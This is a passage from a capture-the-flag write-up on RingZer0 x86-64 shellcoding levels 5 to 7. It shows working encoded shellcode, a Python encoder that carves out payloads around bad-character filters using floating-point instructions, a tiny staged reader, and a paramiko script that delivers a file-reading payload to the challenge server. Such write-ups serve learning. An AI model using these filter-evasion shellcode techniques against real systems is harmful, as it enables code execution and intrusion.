<span class="pl-cce">\x</span>eb<span class="pl-cce">\x</span>22<span class="pl-cce">\x</span>90<span class="pl-cce">\x</span>90<span class="pl-cce">\x</span>69<span class="pl-cce">\x</span>21<span class="pl-cce">\x</span>d0<span class="pl-cce">\x</span>70<span class="pl-cce">\x</span>7f<span class="pl-cce">\x</span>74<span class="pl-cce">\x</span>7e<span class="pl-cce">\x</span>7a<span class="pl-cce">\x</span>6f<span class="pl-cce">\x</span>7a<span class="pl-cce">\x</span>1f<span class="pl-cce">\x</span>15<span class="pl-cce">\x</span>a0<span class="pl-cce">\x</span>12<span class="pl-cce">\x</span>69<span class="pl-cce">\x</span>97<span class="pl-cce">\x</span>e7<span class="pl-cce">\x</span>1f<span class="pl-cce">\x</span>15<span class="pl-cce">\x</span>69<span class="pl-cce">\x</span>87<span class="pl-cce">\x</span>69<span class="pl-cce">\x</span>86<span class="pl-cce">\x</span>1f<span class="pl-cce">\x</span>15<span class="pl-cce">\x</span>a0<span class="pl-cce">\x</span>11<span class="pl-cce">\x</span>70<span class="pl-cce">\x</span>7f<span class="pl-cce">\x</span>1f<span class="pl-cce">\x</span>15<span class="pl-cce">\x</span>d3<span class="pl-cce">\x</span>81<span class="pl-cce">\x</span>70<span class="pl-cce">\x</span>04<span class="pl-cce">\x</span>21<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>20<span class="pl-cce">\x</span>81<span class="pl-cce">\x</span>70<span class="pl-cce">\x</span>08<span class="pl-cce">\x</span>20<span class="pl-cce">\x</span>20<span class="pl-cce">\x</span>20<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>81<span class="pl-cce">\x</span>70<span class="pl-cce">\x</span>0c<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>20<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>81<span class="pl-cce">\x</span>70<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>21<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>81<span class="pl-cce">\x</span>70<span class="pl-cce">\x</span>14<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>21<span class="pl-cce">\x</span>81<span class="pl-cce">\x</span>70<span class="pl-cce">\x</span>18<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>21<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>81<span class="pl-cce">\x</span>70<span class="pl-cce">\x</span>1c<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>20<span class="pl-cce">\x</span>81<span class="pl-cce">\x</span>70<span class="pl-cce">\x</span>20<span class="pl-cce">\x</span>20<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>eb<span class="pl-cce">\x</span>a6
94 ./completed2

$ ssh level5@shellcode.ringzer0team.com -p 7771level5@shellcode.ringzer0team.com<span class="pl-s"><span class="pl-pds">'</span>s password: </span>
<span class="pl-s">Linux ld64deb1 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64</span>
<span class="pl-s">Last login: Thu Feb  5 17:23:29 2015 from 137.224.219.201</span>
<span class="pl-s"></span>
<span class="pl-s">RingZer0 Team CTF Shellcoding Level 5</span>
<span class="pl-s">Submit your shellcode using hex representation "\xcc\xcd".</span>
<span class="pl-s">Type "end" to exit.</span>
<span class="pl-s"></span>
<span class="pl-s">This level have shellcode restriction. Bad char list "\x0a\x0d\x2f\xff\x0f\x05\x68 and \x40 to \x65" max size 100 bytes.</span>
<span class="pl-s">You main goal is to read /flag/level5.flag</span>
<span class="pl-s"></span>
<span class="pl-s">shellcode&gt;\xeb\x22\x90\x90\x69\x21\xd0\x70\x7f\x74\x7e\x7a\x6f\x7a\x1f\x15\xa0\x12\x69\x97\xe7\x1f\x15\x69\x87\x69\x86\x1f\x15\xa0\x11\x70\x7f\x1f\x15\xd3\x81\x70\x04\x21\x10\x10\x20\x81\x70\x08\x20\x20\x20\x10\x81\x70\x0c\x10\x20\x10\x10\x81\x70\x10\x10\x10\x21\x10\x81\x70\x14\x10\x10\x10\x21\x81\x70\x18\x10\x21\x10\x10\x81\x70\x1c\x10\x10\x10\x20\x81\x70\x20\x20\x10\x10\x10\xeb\xa6</span>
<span class="pl-s">    Shellcode received...</span>
<span class="pl-s">    Shellcode length (94) bytes.</span>
<span class="pl-s"></span>
<span class="pl-s">    Success: Executing shellcode...</span>
<span class="pl-s"></span>
<span class="pl-s">/flag/level5.flag^@</span>
<span class="pl-s">FLAG-&lt;redacted&gt;</span>
<span class="pl-s">    Error: SIGSEGV received I think your shellcode is not working.</span></pre></div>
<h2><a id="user-content-level-6" class="anchor" aria-hidden="true" href="https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md#level-6"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Level 6</h2>
<pre><code>Bad char list "\x0a\x0d\x2f\xff\x0f\x05\x68 and \x40 to \x81" max size 90 bytes.
</code></pre>
<p>Things are beginning to look grim! Every time I came up with a solution, the next level would list one or more crucial bytes as a bad char. This time, <code>0x81</code> became a bad char, blocking the use of the <code>xor</code>.</p>
<p>I turned again to the gigantic table over at <a href="http://ref.x86asm.net/coder64.html" rel="nofollow">ref.x64asm.net</a>. I flipped through the list of available opcodes, looking for things that would allow me to decode and carve out the shellcode. Finally, my eyes caught the floating point instructions. One of the variants allows the use of integers as arguments for floating point operations:</p>
<pre><code>fild dword [rax+rbx*4]
fiadd dword [rax+rcx*4]
fistp dword [rax+rcx*4]
</code></pre>
<p>These instructions do not contain bad chars! Furthermore, they allow the use of <code>rax</code> as a pointer to the shellcode, enabling us to carve out stage 1. I used a similar trick as in level 5 to check the viability of this technique:</p>
<pre><code>bits 64

_start:
jmp _decode
nop
nop                     ; align the encoded shellcode to a dword boundary

_stage1:

_0 dd 0xc3c3c3c3        ; these rets should be transformed into jmp $-2
_1 dd 0x90909090
_2 dd 0x90909090
_3 dd 0x90909090
_4 dd 0x90909090
_5 dd 0x90909090
_6 dd 0x90909090

_8 dd 0x3b283b28        ; funny enough, the constant for the add is the same as for the xor!
_9 dd 0x90909090
_a dd 0x90909090
_b dd 0x90909090
_c dd 0x90909090
_d dd 0x90909090
_e dd 0x90909090

_decode:                ; i'd call this stage 0
xor ecx,ecx             ; clear ecx and rcx
xor ebx,ebx             ; clear ebx
mov cl, (_6-_start)/4   ; starting dword for shellcode 
mov bl, (_e-_start)/4   ; starting dword for decoding constants
_decodeloop:
fild dword [rax+rbx*4]  ; load integer into st0
dec bl
fiadd dword [rax+rcx*4] ; add constant to st0
fistp dword [rax+rcx*4] ; store integer at this position, effectively decoding the instructions
loop _decodeloop        ; use the fact that rcx is now an index and a counter

jmp _stage1             ; jump to -hopefully- decoded shellcode
</code></pre>
<p>Again, this hangs the remote program, confirming that this is a viable technique. I adjusted <code>encode.py</code> to generate the right constants. Prepare for some ultra-hacky python:</p>
<div class="highlight highlight-source-python"><pre><span class="pl-k">import</span> struct

carry <span class="pl-k">=</span> <span class="pl-c1">0</span>
<span class="pl-k">def</span> <span class="pl-en">find_sub_bytes</span>(<span class="pl-smi">byte_required</span>):
    <span class="pl-k">global</span> carry
    b <span class="pl-k">=</span> <span class="pl-c1">ord</span>(byte_required) <span class="pl-k">-</span> carry  <span class="pl-c"><span class="pl-c">#</span> compensate for possible carry from previously encoded byte</span>
    <span class="pl-k">for</span> i <span class="pl-k">in</span> <span class="pl-c1">range</span>(<span class="pl-c1">256</span>):
        <span class="pl-k">if</span> i <span class="pl-k">not</span> <span class="pl-k">in</span> badchars:
            c <span class="pl-k">=</span> b <span class="pl-k">-</span> i
            <span class="pl-k">if</span> (c <span class="pl-k">&amp;</span> <span class="pl-c1"><span class="pl-k">0x</span>ff</span>) <span class="pl-k">not</span> <span class="pl-k">in</span> badchars:
                carry <span class="pl-k">=</span> <span class="pl-c1">0</span>
                <span class="pl-k">if</span> c <span class="pl-k">&lt;</span> <span class="pl-c1">0</span>:
                    carry <span class="pl-k">=</span> <span class="pl-c1">1</span>   <span class="pl-c"><span class="pl-c">#</span> this carry is necessary, because the if the byte overflows, it is carried over to the next byte. </span>
                <span class="pl-c"><span class="pl-c">#</span> return the two bytes that encode the required byte</span>
                <span class="pl-k">return</span> <span class="pl-c1">chr</span>(i), <span class="pl-c1">chr</span>(c <span class="pl-k">&amp;</span> <span class="pl-c1"><span class="pl-k">0x</span>ff</span>)
    <span class="pl-c1">print</span> <span class="pl-s"><span class="pl-pds">"</span>cannot find proper byte for <span class="pl-c1">{}</span><span class="pl-pds">"</span></span>.format(b)
    <span class="pl-c1">exit</span>(<span class="pl-k">-</span><span class="pl-c1">1</span>)
        
badchars <span class="pl-k">=</span> [<span class="pl-c1"><span class="pl-k">0x</span>0</span>, <span class="pl-c1"><span class="pl-k">0x</span>a</span>, <span class="pl-c1"><span class="pl-k">0x</span>d</span>, <span class="pl-c1"><span class="pl-k">0x</span>2f</span>, <span class="pl-c1"><span class="pl-k">0x</span>ff</span>, <span class="pl-c1"><span class="pl-k">0x</span>f</span>, <span class="pl-c1"><span class="pl-k">0x</span>5</span>, <span class="pl-c1"><span class="pl-k">0x</span>68</span>]
<span class="pl-k">for</span> i <span class="pl-k">in</span> <span class="pl-c1">range</span>(<span class="pl-c1"><span class="pl-k">0x</span>40</span>, <span class="pl-c1"><span class="pl-k">0x</span>82</span>):
    badchars.append(i)
<span class="pl-c"><span class="pl-c">#</span> paranoia!</span>
<span class="pl-k">for</span> i <span class="pl-k">in</span> <span class="pl-c1">range</span>(<span class="pl-c1"><span class="pl-k">0x</span>1</span>, <span class="pl-c1"><span class="pl-k">0x</span>f</span>):
    badchars.append(i)
    
<span class="pl-k">with</span> <span class="pl-c1">open</span>(<span class="pl-s"><span class="pl-pds">'</span>shellcode<span class="pl-pds">'</span></span>) <span class="pl-k">as</span> sc:
    data <span class="pl-k">=</span> sc.read()
    sc.close()

storage <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>
encoded_bytes <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>
commands <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>
defines <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>
num_commands <span class="pl-k">=</span> <span class="pl-c1">0</span>

<span class="pl-k">while</span> <span class="pl-c1">len</span>(data) <span class="pl-k">%</span> <span class="pl-c1">4</span>:
    data <span class="pl-k">+=</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-cce">\x8f</span><span class="pl-pds">"</span></span>
    
<span class="pl-k">for</span> b <span class="pl-k">in</span> data:
    (b1, b2) <span class="pl-k">=</span> find_sub_bytes(b)
    
    storage <span class="pl-k">+=</span> b1
    encoded_bytes <span class="pl-k">+=</span> b2
    <span class="pl-k">if</span> <span class="pl-c1">len</span>(storage) <span class="pl-k">==</span> <span class="pl-c1">4</span>:
        <span class="pl-c"><span class="pl-c">#</span> emit</span>
        carry <span class="pl-k">=</span> <span class="pl-c1">0</span>   <span class="pl-c"><span class="pl-c">#</span> clear carry, not necessary for next dword!</span>
        commands <span class="pl-k">+=</span> <span class="pl-s"><span class="pl-pds">"</span>_a<span class="pl-c1">{}</span> dd <span class="pl-c1">{}</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>.format(num_commands, <span class="pl-c1">hex</span>(struct.unpack(<span class="pl-s"><span class="pl-pds">'</span>&lt;L<span class="pl-pds">'</span></span>, storage)[<span class="pl-c1">0</span>]))
        defines <span class="pl-k">+=</span> <span class="pl-s"><span class="pl-pds">"</span>_b<span class="pl-c1">{}</span> dd <span class="pl-c1">{}</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>.format(num_commands, <span class="pl-c1">hex</span>(struct.unpack(<span class="pl-s"><span class="pl-pds">'</span>&lt;L<span class="pl-pds">'</span></span>, encoded_bytes)[<span class="pl-c1">0</span>]))
        storage <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>
        encoded_bytes <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>
        num_commands <span class="pl-k">+=</span> <span class="pl-c1">1</span>
                    
<span class="pl-c1">print</span> <span class="pl-s"><span class="pl-pds">"""</span>default rel</span>
<span class="pl-s">bits 64</span>
<span class="pl-s"></span>
<span class="pl-s">;mov rax, 10</span>
<span class="pl-s">;mov rdi, 0x400000</span>
<span class="pl-s">;mov rsi, 0x1000</span>
<span class="pl-s">;mov rdx, 7</span>
<span class="pl-s">;syscall</span>
<span class="pl-s"></span>
<span class="pl-s">;lea rax, [_start]</span>
<span class="pl-s"></span>
<span class="pl-s">_start:</span>
<span class="pl-s">_stage0:                ; stage0 will carve out stage1 </span>
<span class="pl-s">xor ecx,ecx</span>
<span class="pl-s">jmp _decoder</span>
<span class="pl-s"><span class="pl-pds">"""</span></span>
<span class="pl-c1">print</span> commands
<span class="pl-c1">print</span> defines
<span class="pl-c1">print</span> <span class="pl-s"><span class="pl-pds">"""</span></span>
<span class="pl-s">_decoder:</span>
<span class="pl-s">xor ebx,ebx</span>
<span class="pl-s">mov cl, (_a<span class="pl-c1">{}</span>-_start)/4</span>
<span class="pl-s">mov bl, (_b<span class="pl-c1">{}</span>-_start)/4</span>
<span class="pl-s">_decodeloop:</span>
<span class="pl-s">fild dword [rax+rbx*4]</span>
<span class="pl-s">dec bl</span>
<span class="pl-s">fiadd dword [rax+rcx*4]</span>
<span class="pl-s">fistp dword [rax+rcx*4]</span>
<span class="pl-s">loop _decodeloop</span>
<span class="pl-s">jmp _a0</span>
<span class="pl-s"></span>
<span class="pl-s"><span class="pl-pds">"""</span></span>.format(num_commands<span class="pl-k">-</span><span class="pl-c1">1</span>, num_commands<span class="pl-k">-</span><span class="pl-c1">1</span>)</pre></div>
<p>This generated the following assembly:</p>
<pre><code>bits 64

_start:
_stage0:                ; stage0 will carve out stage1 
xor ecx,ecx
jmp _decoder

_a0 dd 0x11101010
_a1 dd 0x2b1f1520
_a2 dd 0x10111a82
_a3 dd 0x89101010
_a4 dd 0x10101110
_a5 dd 0x11101010
_a6 dd 0x10101010
_a7 dd 0x10101120

_b0 dd 0x3fb02138
_b1 dd 0x3f3f3f3f
_b2 dd 0xf4fe3ffd
_b3 dd 0xfe37f2a0
_b4 dd 0x37f4fee7
_b5 dd 0xfe863887
_b6 dd 0x3ff19ff5
_b7 dd 0xb2f4fe3f


_decoder:
xor ebx,ebx
mov cl, (_a7-_start)/4
mov bl, (_b7-_start)/4
_decodeloop:
fild dword [rax+rbx*4]
dec bl
fiadd dword [rax+rcx*4]
fistp dword [rax+rcx*4]
loop _decodeloop
jmp _a0
</code></pre>
<p>There was, however, a huge problem. The instruction <code>jmp _decoder</code> generated a bad char: <code>0x40</code>. This is because it has to jump over two times 32 bytes of data to reach the decoder, which is exactly 64 bytes. However, the shellcode is only 31 bytes long, while I store 32 bytes. That means that the last byte is redundant! I exploited this fact by making this final byte a NOP. But because it is used in the decoding process, I had to modify <code>encode.py</code> again.</p>
<div class="highlight highlight-source-python"><pre><span class="pl-k">while</span> <span class="pl-c1">len</span>(data) <span class="pl-k">%</span> <span class="pl-c1">4</span>:
    <span class="pl-c"><span class="pl-c">#</span>data += "\xc3"</span>
    data <span class="pl-k">+=</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-cce">\x8f</span><span class="pl-pds">"</span></span>  <span class="pl-c"><span class="pl-c">#</span> found by trial &amp; error ;)</span></pre></div>
<p>This modifies the two last constants:</p>
<pre><code>_a7 dd 0x90101120
...
_b7 dd 0xfef4fe3f
</code></pre>
<p>I switched them around, so that the last byte of _b7 would be the 0x90 byte. Then, I could jump there:</p>
<pre><code>jmp _b7+3           ; assembles to eb 3f -&gt; no more badchars!

...
_a7 dd 0xfef4fe3f
...
_b7 dd 0x90101120   ; this was 0xfef4fe3f (little endianess)
</code></pre>
<p>The working shellcode now looks like this:</p>
<pre><code>bits 64

_start:
_stage0:                ; stage0 will carve out stage1 
xor ecx,ecx
jmp _b7+3               ; jump to the NOP, avoiding a bad char.

_a0 dd 0x11101010
_a1 dd 0x2b1f1520
_a2 dd 0x10111a82
_a3 dd 0x89101010
_a4 dd 0x10101110
_a5 dd 0x11101010
_a6 dd 0x10101010
_a7 dd 0xfef4fe3f

_b0 dd 0x3fb02138
_b1 dd 0x3f3f3f3f
_b2 dd 0xf4fe3ffd
_b3 dd 0xfe37f2a0
_b4 dd 0x37f4fee7
_b5 dd 0xfe863887
_b6 dd 0x3ff19ff5
_b7 dd 0x90101120

_decoder:
xor ebx,ebx

mov cl, (_a7-_start)/4
mov bl, (_b7-_start)/4
_decodeloop:    
fild dword [rax+rbx*4]  ; load integer
dec bl
fiadd dword [rax+rcx*4] ; do the actual decoding
fistp dword [rax+rcx*4] ; store the decoded bytes
loop _decodeloop        ; use rcx as counter and index
jmp _a0                 ; jump to decoded shellcode
</code></pre>
<p>Let's run it!</p>
<pre><code>shellcode&gt;\x31\xc9\xeb\x3f\x10\x10\x10\x11\x20\x15\x1f\x2b\x82\x1a\x11\x10\x10\x10\x10\x89\x10\x11\x10\x10\x10\x10\x10\x11\x10\x10\x10\x10\x3f\xfe\xf4\xfe\x38\x21\xb0\x3f\x3f\x3f\x3f\x3f\xfd\x3f\xfe\xf4\xa0\xf2\x37\xfe\xe7\xfe\xf4\x37\x87\x38\x86\xfe\xf5\x9f\xf1\x3f\x20\x11\x10\x90\x31\xdb\xb1\x08\xb3\x10\xdb\x04\x98\xfe\xcb\xda\x04\x88\xdb\x1c\x88\xe2\xf3\xeb\xab
    Shellcode received...
    Shellcode length (89) bytes.

    Success: Executing shellcode...

/flag/level6.flag^@
FLAG-&lt;redacted&gt;
Connection to shellcode.ringzer0team.com closed.
</code></pre>
<p>Got it with <em>one</em> byte to spare!</p>
<h2><a id="user-content-level-7-ultra-violence" class="anchor" aria-hidden="true" href="https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md#level-7-ultra-violence"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Level 7: Ultra-Violence</h2>
<p>OK, I thought the last level was pretty hard, having to resort to floating point instructions to carve out a shellcode. I was shocked to see the description for level 7:</p>
<pre><code>This level have shellcode restriction. Bad char list "\x0a\x0d\x2f\xff\x0f\x05\x68 and \x30 to \x81" max size 40 bytes.
For an unknown funky reason I decide to add couple of random bytes in your buffer after the twentieth character.
Random chunk of bytes size is based on "rand() % 20"
</code></pre>
<p>Waaaaat. A shit-ton of bad chars, plus it seems I couldn't trust whatever I sent after the twentieth bytes. This effectively cut my shellcode size to <em>just twenty bytes</em>. I could never send in a stage0 that would carve out the real shellcode, as there was simply not enough space. Instead, my stage 0 would have to read in the shellcode from the socket directly. So, I needed a way to call <code>syscall</code> to read from stdin. However, <code>0x0f</code> and <code>0x05</code> are badchars. Furthermore, where exactly would I store this newly read shellcode?</p>
<p>Here's what I came up with. I'll dump out stage 0 and explain it, going bit by bit (just as I did when making this monstrosity). This assembles to <em>exactly</em> 20 bytes:</p>
<pre><code>bits 64
_start:                 
add al, _syscall-_start
fldz                    
fsub dword [rax]        
fistp dword [rax]       
sbb esi, esi            
xchg esi, edi           
sbb esi, esi            
mov dl, 0xf0            
_syscall:
dd -84907592.0          
</code></pre>
<p>First things first, we need some way to decode an encoded version of <code>syscall</code>. Again, I turned to floating point instructions. I could a zero and then subtract another float; I might be able to get the resulting integer to decode to <code>syscall</code>!</p>
<p>Due to the size limitation, I could only encode four bytes. The rest of the shellcode would not only need to take care of decoding these four bytes, but also setting up the registers for <code>syscall read</code>.</p>
<pre><code>bits 64
_start:                 ; shellcode stage0: read in stage1
add al, _syscall-_start ; point rax to encoded instruction
</code></pre>
<p>I didn't care anymore about using <code>rcx</code> as a counter and index. I needed to adjust the pointer to the right address, which contained an encoded dword. The decoding of this dword is handle by these instructions:</p>
<pre><code>fldz                    ; setup st0
fsub dword [rax]        ; subtract encoded instruction
fistp dword [rax]       ; store them again
</code></pre>
<p>The dword that I chose to encode were actually these instructions:</p>
<pre><code>bits 64
xchg rax,rsi
syscall
</code></pre>
<p>These would assembled to:</p>
<pre><code>$ xxd small
0000000: 4896 0f05
</code></pre>
<p>I then turned to python:</p>
<div class="highlight highlight-source-python"><pre><span class="pl-ii">$</span> python
Python <span class="pl-c1">2.7</span>.3 (default, Mar <span class="pl-c1">13</span> <span class="pl-c1">2014</span>, <span class="pl-c1">11</span>:<span class="pl-c1">0<span class="pl-ii">3</span></span>:<span class="pl-c1">55</span>) 
[<span class="pl-c1">GCC</span> <span class="pl-c1">4.7</span>.2] on linux2
Type <span class="pl-s"><span class="pl-pds">"</span>help<span class="pl-pds">"</span></span>, <span class="pl-s"><span class="pl-pds">"</span>copyright<span class="pl-pds">"</span></span>, <span class="pl-s"><span class="pl-pds">"</span>credits<span class="pl-pds">"</span></span> <span class="pl-k">or</span> <span class="pl-s"><span class="pl-pds">"</span>license<span class="pl-pds">"</span></span> <span class="pl-k">for</span> more information.
<span class="pl-k">&gt;&gt;</span><span class="pl-k">&gt;</span> <span class="pl-c1"><span class="pl-k">0x</span>050f9648</span>
<span class="pl-c1">84907592</span></pre></div>
<p>I was lucked out here. I tried many things, but this value, stored as a negative float, did <strong>not</strong> contain any bad chars!</p>
<pre><code>sbb esi, esi            ; set rsi to zero
xchg esi, edi           ; used for edi -&gt; stdin
sbb esi, esi            ; set rsi to zero, used for rax -&gt; read
mov dl, 0xf0            ; read in 0xf0 bytes, hopefully enough
_syscall:
dd -84907592.0          ; this is actually xchg rax, rsi; syscall but encoded as a float!
</code></pre>
<p>The <code>sbb</code> instruction is just another way of saying <code>sub esi, esi</code>. The <code>sub</code> instruction contains a bad char. Operations on <code>rsi</code> and <code>rdi</code> contained bad chars, but using <code>esi</code> and <code>edi</code> still had the desired effect of zeroing out the registers.</p>
<p>Finally, just before the <code>syscall</code> would be executed, the registers look like this:</p>
<pre><code>rsi: address of _syscall
rdi: zero (stdin)
rax: zero (syscall read)
</code></pre>
<p>Upon executing the syscall, code execution will go into kernel space, reading from stdin <em>to</em> the address of _syscall, overwriting the instructions that come after it.</p>
<p>Which lead me to another problem: how do we send the shellcode? I couldn't send raw bytes over <code>ssh</code>. One option was to encode the shellcode again, using an alphanumeric carver. I decided to put that option on hold. I tried to port-forward the ssh connection so that I could use python and sockets to get the flag; didn't work. Instead, I had to turn to some paramiko black magic. Behold, <code>fullauto.py</code>!</p>
<div class="highlight highlight-source-python"><pre><span class="pl-k">import</span> paramiko
<span class="pl-k">import</span> time

ssh <span class="pl-k">=</span> paramiko.SSHClient()
<span class="pl-c"><span class="pl-c">#</span> fix missing hostkey -&gt; https://stackoverflow.com/questions/10670217/paramiko-unknown-server</span>
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())   
ssh.connect(<span class="pl-s"><span class="pl-pds">'</span>shellcode.ringzer0team.com<span class="pl-pds">'</span></span>, <span class="pl-v">username</span><span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">'</span>level7<span class="pl-pds">'</span></span>, <span class="pl-v">password</span><span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">'</span>FLAG-&lt;redacted&gt;<span class="pl-pds">'</span></span>, <span class="pl-v">port</span><span class="pl-k">=</span><span class="pl-c1">7771</span>)

<span class="pl-c"><span class="pl-c">#</span> this was the only thing that worked for me. opening a channel via a transport failed miserably.</span>
chan <span class="pl-k">=</span> ssh.invoke_shell()
time.sleep(<span class="pl-c1">0.2</span>)

<span class="pl-c1">print</span> chan.recv(<span class="pl-c1">1024</span>)
time.sleep(<span class="pl-c1">0.2</span>)

<span class="pl-c"><span class="pl-c">#</span> send stage0, which will attempt to read from stdin. mind the last \n!</span>
chan.send(<span class="pl-s"><span class="pl-pds">"</span><span class="pl-cce">\\</span>x04<span class="pl-cce">\\</span>x10<span class="pl-cce">\\</span>xd9<span class="pl-cce">\\</span>xee<span class="pl-cce">\\</span>xd8<span class="pl-cce">\\</span>x20<span class="pl-cce">\\</span>xdb<span class="pl-cce">\\</span>x18<span class="pl-cce">\\</span>x19<span class="pl-cce">\\</span>xf6<span class="pl-cce">\\</span>x87<span class="pl-cce">\\</span>xf7<span class="pl-cce">\\</span>x19<span class="pl-cce">\\</span>xf6<span class="pl-cce">\\</span>xb2<span class="pl-cce">\\</span>xf0<span class="pl-cce">\\</span>xc9<span class="pl-cce">\\</span>xf2<span class="pl-cce">\\</span>xa1<span class="pl-cce">\\</span>xcc<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>)
time.sleep(<span class="pl-c1">0.2</span>)

<span class="pl-c1">print</span> chan.recv(<span class="pl-c1">256</span>)
time.sleep(<span class="pl-c1">0.2</span>)

<span class="pl-c"><span class="pl-c">#</span> we'll need a small NOP sled to get us to the shellcode</span>
payload <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-cce">\x90</span><span class="pl-pds">"</span></span> <span class="pl-k">*</span> <span class="pl-c1">20</span>

<span class="pl-c"><span class="pl-c">#</span> read in the 31 byte shellcode, designed to open/read/write a file</span>
<span class="pl-k">with</span> <span class="pl-c1">open</span>(<span class="pl-s"><span class="pl-pds">'</span>modified-shellcode3<span class="pl-pds">'</span></span>) <span class="pl-k">as</span> f:
    data <span class="pl-k">=</span> f.read()
    payload <span class="pl-k">+=</span> data
    f.close()
    
chan.send(payload<span class="pl-k">+</span><span class="pl-s"><span class="pl-pds">'</span><span class="pl-cce">\n</span><span class="pl-pds">'</span></span>)
time.sleep(<span class="pl-c1">0.2</span>)

chan.send(<span class="pl-s"><span class="pl-pds">'</span>/flag/level7.flag<span class="pl-cce">\x00\n</span><span class="pl-pds">'</span></span>)
<span class="pl-c1">print</span> chan.recv(<span class="pl-c1">256</span>)
time.sleep(<span class="pl-c1">0.2</span>)

<span class="pl-c"><span class="pl-c">#</span> receive flag!</span>
<span class="pl-c1">print</span> chan.recv(<span class="pl-c1">256</span>)</pre></div>
<p>Running this python script with the appropriate password to level 7 spat out, amongst others, <em>part</em> of the final flag!</p>
<p>Something funky was going on. The stage 2 was being read and executed, but the contents of the flag on the stack were being mangled.</p>
<p>I finally traced it to this part of the shellcode:</p>
<pre><code>lea rsi, [rsp]

...

mov al, 1
push rax            ; the push seems to mangle the output on the stack
pop rdi             ; fd = stdout
                    ; rsi = still pointer to buffer
                    ; rdx = still 0x7f
syscall
ret
</code></pre>
<p>Substituting it for this seemed to do the trick:</p>
<pre><code>lea rsi, [rsp+60]

...

mov rdx, rax        ; number of bytes read; output exactly the contents of flag. it's cleaner this way
mov al, 1
push rax            ; the push seems to mangle the output on the stack
pop rdi             ; fd = stdout
                    ; rsi = still pointer to buffer
                    ; rdx = still 0x7f
syscall
ret

</code></pre>
<p>I'm still puzzled why this originally mangled the output on the stack, where I had no problems with this shellcode before. If anyone has an idea, let me know in the comments :)</p>
<h2><a id="user-content-final-words" class="anchor" aria-hidden="true" href="https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md#final-words"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Final words</h2>
<p>Phew, what a ride! These challenges were a lot of fun and taught me several interesting concepts about x86-64 shellcoding. Thank you <a href="http://ringzer0team.com/" rel="nofollow">RingZer0Team</a> for these awesome challenges!</p>
